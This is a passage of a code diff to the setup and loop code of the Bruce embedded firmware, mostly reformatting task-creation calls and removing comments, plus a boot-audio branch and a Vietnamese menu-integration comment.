+    } else if (LittleFS.exists("/boot.wav")) {
+        playAudioFile(&LittleFS, "/boot.wav");
+    }
+#endif
+#endif
+}
+
+// ===================== Main Menu Integration =====================
+// Các hàm này sẽ được gọi từ main menu của Bruce framework
+
 void setup() {
     Serial.setRxBufferSize(SAFE_STACK_BUFFER_SIZE / 4);
     Serial.begin(115200);
@@ -750,7 +1112,6 @@ void setup() {
 
     options.reserve(20);
 
-    // Cấu hình WiFi
     const wifi_country_t country = {
         .cc = "US",
         .schan = 1,
@@ -766,14 +1127,7 @@ void setup() {
 
     _post_setup_gpio();
 
-    xTaskCreate(
-        taskInputHandler,
-        "InputHandler",
-        INPUT_HANDLER_TASK_STACK_SIZE,
-        NULL,
-        2,
-        &xHandle
-    );
+    xTaskCreate(taskInputHandler, "InputHandler", INPUT_HANDLER_TASK_STACK_SIZE, NULL, 2, &xHandle);
     
 #if defined(HAS_SCREEN)
     bruceConfig.openThemeFile(bruceConfig.themeFS(), bruceConfig.themePath, false);
@@ -783,14 +1137,7 @@ void setup() {
     }
     if (bruceConfig.wifiAtStartup) {
         log_i("Loading Wifi at Startup");
-        xTaskCreate(
-            wifiConnectTask,
-            "wifiConnectTask",
-            4096,
-            NULL,
-            2,
-            NULL
-        );
+        xTaskCreate(wifiConnectTask, "wifiConnectTask", 4096, NULL, 2, NULL);
     }
 #endif
     
@@ -802,10 +1149,6 @@ void setup() {
     }
 }
 
-/**********************************************************************
- **  Function: loop
- **  Main loop
- **********************************************************************/
 #if defined(HAS_SCREEN)
 void loop() {
 #if !defined(LITE_VERSION) && !defined(DISABLE_INTERPRETER)
